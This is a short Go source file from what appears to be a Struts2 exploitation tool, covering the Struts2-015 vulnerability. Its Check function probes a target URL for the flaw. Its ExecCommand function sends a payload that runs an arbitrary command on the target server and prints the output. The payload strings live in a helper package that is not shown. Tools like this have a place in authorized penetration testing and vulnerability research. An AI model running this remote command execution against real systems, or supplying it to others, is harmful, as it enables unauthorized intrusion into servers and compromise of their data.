package s015

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
)

func Check(targetUrl string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS015Check)
	if utils.IfContainsStr(respString, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-015！"))
	} else {
		log.Printf("%s Struts2-015 Not Vulnerable.", utils.Green(targetUrl))
	}
}
func ExecCommand(targetUrl string, command string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS015Exec(command))
	execResult := utils.GetBetweenStr(respString, "s015execstart", "s015execend")
	fmt.Println(execResult[13:])
}
